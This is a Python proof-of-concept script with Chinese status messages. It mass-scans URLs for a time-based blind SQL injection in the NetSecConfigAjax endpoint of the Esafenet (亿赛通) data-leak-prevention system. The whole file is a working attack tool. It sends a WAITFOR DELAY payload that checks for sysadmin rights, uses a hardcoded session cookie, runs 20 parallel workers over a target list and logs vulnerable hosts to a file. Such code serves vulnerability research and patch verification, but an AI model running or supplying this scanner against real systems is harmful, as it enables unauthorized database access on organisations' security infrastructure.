import requests,argparse,time,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool
def banner():
    test = """
 ____  ____   ______   _________  
|_  _||_  _|.' ____ \ |  _   _  | 
  \ \  / /  | (___ \_||_/ | | \_| 
   \ \/ /    _.____`.     | |     
   _|  |_   | \____) |   _| |_    
  |______|   \______.'  |_____|   
                                  
"""
    print(test)

def poc(target):
    path = "/CDGServer3/NetSecConfigAjax;Service"
    payload = "command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--"
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'JSESSIONID=BFFA734FFFC1D940FA2710CD18F4CA23'
    }
    start_time = time.time()
    try:
        response = requests.post(target + path, data=payload, headers=headers, timeout=10, verify=False)
        end_time = time.time()
        if end_time - start_time > 5 and response.status_code and "Burp Suite" not in response.text:
            print(f"[+] {target} 存在亿赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL 注入漏洞")
            with open("亿赛通_result","a",encoding="utf-8") as f:
                f.write(f"{target}存在sql注入\n")
        else:
            print(f"[-] {target} 不存在sql注入漏洞")
    except Exception as e:
        print(f"[-] {target} 可能存在问题")


def main():
    banner()
    parser =argparse.ArgumentParser(description="亿赛通数据泄露防护(DLP)系统 NetSecConfigAjax SQL 注入漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
if __name__ == '__main__':
    main()